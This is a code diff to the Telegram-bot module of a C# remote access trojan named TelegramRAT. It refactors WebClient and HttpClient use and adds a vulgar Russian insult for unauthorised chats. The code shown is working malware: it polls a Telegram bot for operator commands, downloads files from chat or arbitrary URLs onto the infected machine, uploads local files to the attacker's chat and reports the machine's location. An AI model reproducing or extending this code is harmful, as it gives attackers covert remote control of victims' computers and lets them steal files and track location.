@@ -9,18 +9,17 @@ namespace TelegramRAT
 {
     internal class telegram
     {
-
-        // Client
-        private static WebClient Bot = new WebClient();
-        private static int LastUpdateID = 0;
-
+        // Thread
+        public static Thread waitCommandsThread = new Thread(waitCommands);
 
         // Wait commands
-        public static void waitCommands()
+        private static void waitCommands()
         {
             // Get last update id
+            int LastUpdateID = 0;
             string response;
-            response = Bot.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates");
+            using (WebClient client = new WebClient())
+                response = client.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates");
             LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;
 
             // Get commands
@@ -29,7 +28,8 @@ namespace TelegramRAT
                 // Sleep
                 Thread.Sleep(config.TelegramCommandCheckDelay * 1000);
                 // Get commands
-                response = Bot.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates" + "?offset=" + (LastUpdateID + 1));
+                using (WebClient client = new WebClient())
+                    response = client.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates" + "?offset=" + (LastUpdateID + 1));
                 var json = JSON.Parse(response);
 
                 foreach (JSONNode r in json["result"].AsArray)
@@ -41,7 +41,8 @@ namespace TelegramRAT
                     // If not the creator of the bot writes
                     if (chatid != config.TelegramChatID)
                     {
-                        sendText("👑 You not my owner!", chatid);
+                        sendText("👑 You not my owner, поэтому отсоси мой божественный член сука!", chatid);
+                        Console.WriteLine(chatid);
                     }
                     // Download file from chat to computer
                     if (message.HasKey("document"))
@@ -49,12 +50,17 @@ namespace TelegramRAT
                         // Get document info
                         string fileName = message["document"]["file_name"];
                         string fileID = message["document"]["file_id"];
-                        var filePath = JSON.Parse(Bot.DownloadString(
-                            "https://api.telegram.org/bot" +
-                            config.TelegramToken +
-                            "/getFile" +
-                            "?file_id=" + fileID
-                        ))["result"]["file_path"];
+                        JSONNode filePath;
+                        // Get file path
+                        using (WebClient client = new WebClient())
+                        {
+                            filePath = JSON.Parse(client.DownloadString(
+                                "https://api.telegram.org/bot" +
+                                config.TelegramToken +
+                                "/getFile" +
+                                "?file_id=" + fileID
+                            ))["result"]["file_path"];
+                        }
                         // Download
                         DownloadFile(fileName, filePath);
                     }
@@ -87,27 +93,30 @@ namespace TelegramRAT
                 return;
             }
             // Send file
-            HttpClient httpClient = new HttpClient();
-            MultipartFormDataContent fform = new MultipartFormDataContent();
-            var file_bytes = File.ReadAllBytes(file);
-            fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
-            var rresponse = httpClient.PostAsync("https://api.telegram.org/bot" + config.TelegramToken + "/send" + type + "?chat_id=" + config.TelegramChatID, fform);
-            rresponse.Wait();
-            httpClient.Dispose();
-            // string sd = rresponse.Result.Content.ReadAsStringAsync().Result;
-            // Console.WriteLine(sd);
+            using (HttpClient httpClient = new HttpClient())
+            {
+                MultipartFormDataContent fform = new MultipartFormDataContent();
+                var file_bytes = File.ReadAllBytes(file);
+                fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
+                var rresponse = httpClient.PostAsync("https://api.telegram.org/bot" + config.TelegramToken + "/send" + type + "?chat_id=" + config.TelegramChatID, fform);
+                rresponse.Wait();
+                httpClient.Dispose();
+            }
         }
 
         // Send text
         public static void sendText(string text, string chatID = config.TelegramChatID)
         {
-            Bot.DownloadString(
-                "https://api.telegram.org/bot" +
-                config.TelegramToken +
-                "/sendMessage" +
-                "?chat_id=" + chatID +
-                "&text=" + text
-            );
+            using (WebClient client = new WebClient())
+            {
+                client.DownloadString(
+                    "https://api.telegram.org/bot" +
+                    config.TelegramToken +
+                    "/sendMessage" +
+                    "?chat_id=" + chatID +
+                    "&text=" + text
+                );
+            }
         }
 
         // Send image
@@ -125,14 +134,17 @@ namespace TelegramRAT
         // Send location
         public static void sendLocation(float lat, float lon)
         {
-            Bot.DownloadString(
-                "https://api.telegram.org/bot" +
-                config.TelegramToken +
-                "/sendLocation" +
-                "?chat_id=" + config.TelegramChatID +
-                "&latitude=" + lat +
-                "&longitude=" + lon
-            );
+            using (WebClient client = new WebClient())
+            {
+                client.DownloadString(
+                    "https://api.telegram.org/bot" +
+                    config.TelegramToken +
+                    "/sendLocation" +
+                    "?chat_id=" + config.TelegramChatID +
+                    "&latitude=" + lat +
+                    "&longitude=" + lon
+                );
+            } 
         }
         // Send file from chat/url to computer
         public static void DownloadFile(string file, string path = "")
@@ -143,7 +155,8 @@ namespace TelegramRAT
                 sendText(String.Format("📄 Downloading file \"{0}\" from url", Path.GetFileName(file)));
                 try
                 {
-                    Bot.DownloadFile(new Uri(file), Path.GetFileName(file));
+                    using (WebClient client = new WebClient())
+                        client.DownloadFile(new Uri(file), Path.GetFileName(file));
                 } catch
                 {
                     sendText(String.Format("💥 Connection error"));
@@ -156,7 +169,8 @@ namespace TelegramRAT
             {
                 sendText(String.Format("📄 Downloading file: \"{0}\"", file));
                 path = @"https://api.telegram.org/file/bot" + config.TelegramToken + "/" + path;
-                Bot.DownloadFile(new Uri(path), file);
+                using (WebClient client = new WebClient())
+                    client.DownloadFile(new Uri(path), file);
                 sendText(String.Format("💾 File \"{0}\" saved in: \"{1}\"", file, Path.GetFullPath(file)));
             }   
         }
